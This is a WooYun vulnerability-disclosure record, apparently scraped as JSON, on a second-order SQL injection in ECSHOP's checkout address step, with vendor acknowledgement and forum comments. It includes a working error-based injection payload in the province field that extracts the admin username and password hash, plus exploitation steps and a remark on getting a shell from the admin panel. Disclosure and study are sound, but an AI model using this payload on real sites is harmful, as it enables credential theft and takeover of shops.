{"id": 14627, "wybug_id": "wooyun-2012-016651", "wybug_title": "ECSHOP全版本注入漏洞（二次注入）", "wybug_corp": "ShopEx", "wybug_author": "y35u", "wybug_date": "2012-12-28 22:42", "wybug_open_date": "2013-02-11 22:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["二次注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-11：\t细节向公众公开  简要描述： ECSHOP全版本注入漏洞（二次注入） 详细说明：  \nfunction get_consignee($user_id){    if (isset($_SESSION['flow_consignee']))    {        /* 如果存在session，则直接返回session中的收货人信息 */        return $_SESSION['flow_consignee']; //从$_SESSION取得province等数据    }    else    {        /* 如果不存在，则取得用户的默认收货人信息 */        $arr = array();        if ($user_id > 0)        {            /* 取默认地址 */            $sql = \"SELECT ua.*\".                    \" FROM \" . $GLOBALS['ecs']->table('user_address') . \"AS ua, \".$GLOBALS['ecs']->table('users').' AS u '.                    \" WHERE u.user_id='$user_id' AND ua.address_id = u.address_id\";            $arr = $GLOBALS['db']->getRow($sql);        }        return $arr;    }}\n把任意商品加入购物车在填写配送地址那一页，有地区选择flow.php?step=consignee&direct_shopping=1比如省选择安徽其中POST数据如下country=1&province=3&city=37&district=409&consignee=11111&email=11111111%40qq.com&address=1111111111&zipcode=11111111&tel=1111111111111111111&mobile=11111111&sign_building=111111111&best_time=111111111&Submit=%E9%85%8D%E9%80%81%E8%87%B3%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80&step=consignee&act=checkout&address_id=province=3改成\nprovince=3') and (select 1 from(select count(*),concat((select (select (SELECT concat(user_name,0x7c,password) FROM ecs_admin_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1 #\n   漏洞证明：  详细的方法，用火狐tamper data插件........即可改post内容.....先注册账户，随便选个商品进购物车，然后填地址，电话什么的，填好开始抓包，改包就会回显错误页面了。。。。我自己没用这个日站过，就测试了一个最新版和老版本外带一句，这里不仅是province，city，country，'district均可注入   修复方案：  一个姗姗来迟的漏洞，见谅   版权声明：转载请注明来源 y35u@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-12-29 23:01 厂商回复： 感谢您为shopex安全做的贡献我们会尽快处理非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-28 22:43 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  有意思    \n     2012-12-28 23:00 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @xsser @洞主 和第一个同类型么 第一个 3')考虑gpc 魔术'号哦     \n     2012-12-28 23:01 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @_Evil 二次注射都不受gpc影响的 这个很赞 求写分析    \n     2012-12-28 23:10 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @xsser 我知道了 1.是编码问题 2.SERVER变量问题 3.数组问题 4.包含文件利用问题(heige讲过) 5.特殊函数问题如截取字符串函数问题 6.CHAR绕过问题   他的是其中一个吧。    \n     2012-12-28 23:13 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @xsser http://www.2cto.com/Article/201212/179861.html 提早公开了 。。。 - - 没看源码知道什么问题了,一大批站被黑-_- 耶稣哥哥你坏人阿    \n     2012-12-28 23:15 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  洞主不是首发乌云！    \n     2012-12-28 23:19 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @_Evil 不是，这里是二次的，session里，比较难发现的    \n     2012-12-29 02:27 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  马克这厮    \n     2012-12-29 11:20 |    \t\tMetasploit \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:7        | http://www.metasploit.cn/)\t\t \n  为啥那么多安全狗出现.....  求FROM绕过    \n     2012-12-29 22:04 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  二次注入。。所以转义不影响    \n     2012-12-30 18:03 |    \t\t/fd \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        )\t\t \n  有2.7.3的後台拿shell嗎    \n     2012-12-31 13:08 |    \t\t江南的鱼 \t\t\t( 普通白帽子  |\t\t\t        Rank:137 漏洞数:15        | 天生庸才！)\t\t \n  @/fd 只要进了后台，就没有拿不到的shell，模版文件可以直接运行shell问题就是如果把后台改名了，猜不到，哪才悲剧。    \n     2012-12-31 14:03 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @xsser 大神二次注入 都不受gpc影响么？ 为啥呢？如果开了gpc 那么单引号(\\')进入数据库后再出来 不也是\\'么？这个漏洞之所以不受影响是因为它把$consignee 保存到session的时候,调用了stripslashes_deep，而这个自定义函数会对数组的每个值调用了stripslashes，导致gpc加的\\在进入session后被转回来了。代码： $_SESSION['flow_consignee'] = stripslashes_deep($consignee); 后来在使用$_SESSION['flow_consignee']操作就有问题了...    \n     2013-01-01 11:33 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @possible 你是黑客    \n     2013-01-19 08:47 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @_Evil @xsser 我说错了 你们都不告诉我 真是坏黑阔    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}